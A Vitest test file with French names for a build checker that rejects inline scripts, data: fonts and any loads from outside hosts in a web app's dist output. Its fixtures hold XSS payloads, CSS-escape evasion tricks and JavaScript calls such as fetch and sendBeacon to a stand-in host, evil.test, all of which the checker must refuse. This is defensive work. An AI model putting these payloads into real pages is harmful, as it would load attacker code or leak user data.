import { spawnSync } from 'node:child_process'
import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { verifieBuild } from './verifie-build.mjs'

const HTML = (tete = '', corps = '<div id="root"></div>') =>
  `<!doctype html><html lang="fr"><head><meta charset="utf-8"><link rel="preload" as="font" type="font/woff2" crossorigin href="/assets/fredoka-latin-abc.woff2"><link rel="stylesheet" href="/assets/index-abc.css">${tete}<script type="module" src="/assets/index-abc.js"></script></head><body>${corps}</body></html>`
const CSS_PROPRE = '@font-face{font-family:Fredoka;src:url(./fredoka-latin-abc.woff2) format("woff2")}.a{background:url(data:image/svg+xml;utf8,<svg/>)}.b{content:"https est permis"}'
const PROPRE = {
  'index.html': HTML(),
  'assets/index-abc.css': CSS_PROPRE,
  'assets/index-abc.js': 'console.log("https://react.dev/errors/418"); new URL("./x", import.meta.url)',
  'assets/fredoka-latin-abc.woff2': 'wOF2',
}

let dossier
beforeEach(() => (dossier = mkdtempSync(join(tmpdir(), 'dist-'))))
afterEach(() => rmSync(dossier, { recursive: true, force: true }))

function dist(surcharges = {}, options) {
  const fichiers = { ...PROPRE, ...surcharges }
  for (const [chemin, contenu] of Object.entries(fichiers)) {
    if (contenu === null) continue
    mkdirSync(dirname(join(dossier, chemin)), { recursive: true })
    writeFileSync(join(dossier, chemin), contenu)
  }
  return verifieBuild(dossier, options)
}

describe('un dist propre', () => {
  it('passe', () => {
    expect(dist()).toEqual([])
  })
})

describe('index.html : rien en ligne', () => {
  it.each([
    ['un script en ligne', HTML('<script>alert(1)</script>')],
    ['un script de module en ligne', HTML('<script type="module">import("./x")</script>')],
    ['un bloc style', HTML('<style>body{color:red}</style>')],
    ['un attribut style', HTML('', '<div style="color:red"></div>')],
    ['un attribut style en majuscules', HTML('', '<div STYLE="color:red"></div>')],
    ['un gestionnaire onclick', HTML('', '<button onclick="x()">a</button>')],
    ['un gestionnaire onload', HTML('', '<img src="/a.png" onload="x()">')],
    ['un script sans espace avant l’attribut (« / » sépare en HTML)', HTML('<script/type=module>x()</script>')],
    ['un bloc style auto-fermé en apparence', HTML('<style/>body{color:red}</style>')],
    ['un gestionnaire séparé par « / »', HTML('', '<div/onclick=alert(1)>a</div>')],
    ['un iframe srcdoc', HTML('', '<iframe srcdoc="<script>alert(1)</script>"></iframe>')],
  ])('refuse %s', (_nom, html) => {
    expect(dist({ 'index.html': html }).length).toBeGreaterThan(0)
  })

  it('accepte un script externe local', () => {
    expect(dist({ 'index.html': HTML('<script src="/assets/autre.js"></script>'), 'assets/autre.js': '' })).toEqual([])
  })
})

describe('aucune police en data:', () => {
  it.each([
    ['css', 'assets/index-abc.css', '@font-face{src:url(data:font/woff2;base64,AAAA)}'],
    ['css, type application', 'assets/index-abc.css', '@font-face{src:url(data:application/font-woff;base64,AAAA)}'],
    ['js', 'assets/index-abc.js', 'var f="data:font/woff2;base64,AAAA"'],
  ])('refuse un data:font dans le %s', (_nom, chemin, contenu) => {
    expect(dist({ [chemin]: contenu }).join('\n')).toMatch(/data:/)
  })
})

describe('aucune URL construite vers un autre hôte dans un css, même dans une classe jamais rendue', () => {
  it.each([
    ['url entre guillemets doubles', '.x{background:url("https://evil.test/x.svg")}'],
    ['url entre guillemets simples', ".x{background:url('https://evil.test/x.svg')}"],
    ['url nue', '.x{background:url(https://evil.test/x.svg)}'],
    ['url avec espaces', ".x{background:url( 'https://evil.test/x' )}"],
    ['url relative au schéma', '.x{background:url(//evil.test/x)}'],
    ['url en http', '.x{background:url(http://evil.test/x)}'],
    ['@import entre guillemets', '@import "https://evil.test/a.css";'],
    ['@import url()', '@import url(https://evil.test/a.css);'],
    ['@import url() avec échappement', '@import url(\\68ttps://evil.test/a.css);'],
    ['échappement avec espace', '.x{background:url(\\68 ttps://evil.test/x)}'],
    ['échappement sur le deux-points', '.x{background:url("https\\3a //evil.test/x")}'],
    ['image-set avec une chaîne', '.x{background:image-set("https://evil.test/x.png" 1x)}'],
    ['src d’une police', '@font-face{font-family:X;src:url("https://evil.test/f.woff2")}'],
    ['data: qui n’est pas une image', '.x{background:url(data:text/html,<script>x</script>)}'],
    ['majuscules', '.x{background:URL(HTTPS://EVIL.TEST/x)}'],
    ['continuation de ligne dans une chaîne', '.x{background:url("/\\\n/evil.test/x")}'],
    ['tabulation dans le schéma', '.x{background:url("ht\ttps://evil.test/x")}'],
    ['antislash pris pour une barre', '.x{background:url("\\5c \\5c evil.test/x")}'],
    ['schéma ftp', '.x{background:url(ftp://evil.test/x)}'],
    ['schéma javascript', '.x{background:url(javascript:alert(1))}'],
    ['-webkit-image-set', '.x{background:-webkit-image-set("https://evil.test/x.png" 1x)}'],
    ['cross-fade', '.x{background:cross-fade(url(https://evil.test/a.png), url(/b.png), 50%)}'],
    ['image()', '.x{background:image("https://evil.test/x.png")}'],
    ['src()', '.x{background:src("https://evil.test/x.png")}'],
    ['content: url()', '.x::after{content:url(https://evil.test/x.png)}'],
  ])('refuse %s', (_nom, css) => {
    expect(dist({ 'assets/index-abc.css': CSS_PROPRE + css }).length).toBeGreaterThan(0)
  })

  it.each([
    ['un sélecteur d’attribut sur « https:// »', 'a[href^="https://"]{color:red}'],
    ['un texte qui commence par « // »', '.c::after{content:"// "}'],
    ['un texte qui commence par « data: »', '.d::after{content:"data: x"}'],
    ['une URL écrite dans un commentaire', '/* url(https://evil.test/x) */.e{color:red}'],
  ])('accepte %s (ce n’est pas une URL chargée)', (_nom, css) => {
    expect(dist({ 'assets/index-abc.css': CSS_PROPRE + css })).toEqual([])
  })

  it('accepte une image data:image/ et une chaîne qui n’est pas une URL', () => {
    expect(dist({ 'assets/index-abc.css': CSS_PROPRE + '.y{background:url("data:image/png;base64,AAAA")}' })).toEqual([])
  })
})

describe('un .html ne référence aucun autre hôte', () => {
  it.each([
    ['un script', '<script src="https://evil.test/x.js"></script>'],
    ['une feuille de style', '<link rel="stylesheet" href="//evil.test/x.css">'],
    ['une image', '<img src="http://evil.test/x.png">'],
    ['une police de Google', '<link href="https://fonts.googleapis.com/css2?family=X" rel="stylesheet">'],
    ['un préchargement', '<link rel="preload" as="font" href="https://evil.test/f.woff2">'],
    ['un srcset', '<img src="/a.png" srcset="https://evil.test/x.png 2x">'],
    ['une base', '<base href="https://evil.test/">'],
    ['un meta refresh', '<meta http-equiv=refresh content="0;url=https://evil.test/">'],
    ['un form action', '<form action="https://evil.test/p"></form>'],
    ['un use SVG', '<svg><use href="https://evil.test/x.svg#a"></use></svg>'],
    ['une image SVG en xlink:href', '<svg><image xlink:href="//evil.test/x.png"></image></svg>'],
    ['un input image', '<input type=image src="https://evil.test/x.png">'],
    ['une référence en entité HTML', '<script src="https&#58;//evil.test/x.js"></script>'],
    ['une URL avec une tabulation que le navigateur retire', '<img src="ht&#9;tps://evil.test/x.png">'],
    ['un lien javascript:', '<a href="javascript:alert(1)">x</a>'],
  ])('refuse %s', (_nom, balise) => {
    expect(dist({ 'index.html': HTML(balise) }).length).toBeGreaterThan(0)
  })
  it('accepte un lien <a> vers un autre site : c’est une navigation, pas un chargement', () => {
    expect(dist({ 'index.html': HTML('', '<a href="https://exemple.fr/">x</a>') })).toEqual([])
  })
})

describe('un .js n’appelle aucun autre hôte', () => {
  it.each([
    ['Google Fonts', 'fetch("https://fonts.googleapis.com/css2?family=X")'],
    ['fonts.gstatic', 'var u="//fonts.gstatic.com/x.woff2"'],
    ['new URL sur https', 'new URL("https://evil.test/x")'],
    ['new URL sur http avec espaces', "new URL( 'http://evil.test/x' )"],
    ['import() dynamique distant', 'import("https://evil.test/m.js")'],
    ['import() avec un commentaire', 'import(/* webpackIgnore */ "https://evil.test/m.js")'],
    ['fetch', 'fetch("https://evil.test/x")'],
    ['fetch avec un gabarit', 'fetch(`https://evil.test/x`)'],
    ['Worker', 'new Worker("https://evil.test/w.js")'],
    ['importScripts (un service worker qui chargerait Workbox d’ailleurs)', 'importScripts("https://evil.test/w.js")'],
    ['import statique', 'import x from"https://evil.test/m.js";console.log(x)'],
    ['export * from', 'export*from"https://evil.test/m.js"'],
    ['sendBeacon', 'navigator.sendBeacon("https://evil.test/b","x")'],
    ['EventSource sur // ', 'new EventSource("//evil.test/s")'],
    ['XMLHttpRequest.open', 'x.open("GET","https://evil.test/x")'],
    ['une affectation de src', 'var s=document.createElement("script");s.src="https://evil.test/x.js"'],
  ])('refuse %s', (_nom, js) => {
    expect(dist({ 'assets/index-abc.js': js }).length).toBeGreaterThan(0)
  })

  it('refuse un js qu’on ne peut pas analyser : on ne le laisse pas passer sans le lire', () => {
    expect(dist({ 'assets/index-abc.js': 'function (' }).join('\n')).toMatch(/analys/)
  })

  it('accepte des appels vers le site lui-même', () => {
    expect(dist({ 'assets/index-abc.js': 'fetch("/api/x");new URL("./x",import.meta.url);new Worker("/w.js")' })).toEqual([])
  })

  it('accepte une chaîne https qui n’est pas appelée (messages d’erreur de React)', () => {
    expect(dist({ 'assets/index-abc.js': 'throw Error("see https://react.dev/errors/1")' })).toEqual([])
  })
})

describe('le manifeste', () => {
  it('refuse une URL vers un autre hôte', () => {
    expect(dist({ 'manifest.webmanifest': JSON.stringify({ icons: [{ src: 'https://evil.test/i.png' }] }) }).length).toBeGreaterThan(0)
  })
  it('accepte un manifeste local', () => {
    expect(dist({ 'manifest.webmanifest': JSON.stringify({ start_url: '/', icons: [{ src: '/icone-192.png' }] }) })).toEqual([])
  })
})

describe('le parcours de dist', () => {
  it('refuse un fichier trop gros pour être analysé : fermé par défaut', () => {
    expect(dist({ 'assets/index-abc.js': 'a'.repeat(50) }, { tailleMax: 10 }).join('\n')).toMatch(/trop gros/)
  })

  it('refuse un lien symbolique', () => {
    dist()
    symlinkSync(join(dossier, 'index.html'), join(dossier, 'lien.html'))
    expect(verifieBuild(dossier).join('\n')).toMatch(/lien symbolique/)
  })
})

describe('banc.html', () => {
  it('est refusé dans un build normal', () => {
    expect(dist({ 'banc.html': HTML() }).join('\n')).toMatch(/banc\.html/)
  })
  it('est refusé dans un sous-dossier, sous un autre casse', () => {
    expect(dist({ 'sous/Banc.HTML': HTML() }).join('\n')).toMatch(/banc/i)
  })
  it('est admis avec l’option du banc', () => {
    expect(dist({ 'banc.html': HTML() }, { banc: true })).toEqual([])
  })
})

describe('les polices référencées existent', () => {
  it('refuse un woff2 de css qui manque', () => {
    expect(dist({ 'assets/index-abc.css': CSS_PROPRE + '@font-face{src:url(./absente.woff2)}' }).join('\n')).toMatch(/absente\.woff2/)
  })
  it('refuse un woff2 dont le chemin sort de dist, même si le fichier existe ailleurs', () => {
    const hors = join(dossier, '..', 'police-hors-dist.woff2')
    writeFileSync(hors, 'wOF2')
    try {
      expect(dist({ 'assets/index-abc.css': CSS_PROPRE + '@font-face{src:url(../../police-hors-dist.woff2)}' }).join('\n')).toMatch(/hors de dist/)
    } finally {
      rmSync(hors)
    }
  })
  it('refuse un woff2 préchargé qui manque', () => {
    expect(dist({ 'assets/fredoka-latin-abc.woff2': null, 'index.html': HTML() }, undefined).join('\n')).toMatch(/fredoka-latin-abc\.woff2/)
  })
})

describe('la commande', () => {
  const SCRIPT = fileURLToPath(new URL('./verifie-build.mjs', import.meta.url))
  const lance = (...args) => spawnSync(process.execPath, [SCRIPT, ...args], { encoding: 'utf8' })

  it('rend 0 sur un dist propre et 1 sur un dist qui a un script en ligne', () => {
    dist()
    expect(lance(dossier).status).toBe(0)
    writeFileSync(join(dossier, 'index.html'), HTML('<script>x</script>'))
    const resultat = lance(dossier)
    expect(resultat.status).toBe(1)
    expect(resultat.stderr).toContain('index.html')
  })

  it('rend 1 sans argument ou sur un dossier absent', () => {
    expect(lance().status).toBe(1)
    expect(lance(join(dossier, 'absent')).status).toBe(1)
  })

  it('--banc admet banc.html', () => {
    dist({ 'banc.html': HTML() })
    expect(lance(dossier).status).toBe(1)
    expect(lance(dossier, '--banc').status).toBe(0)
  })
})
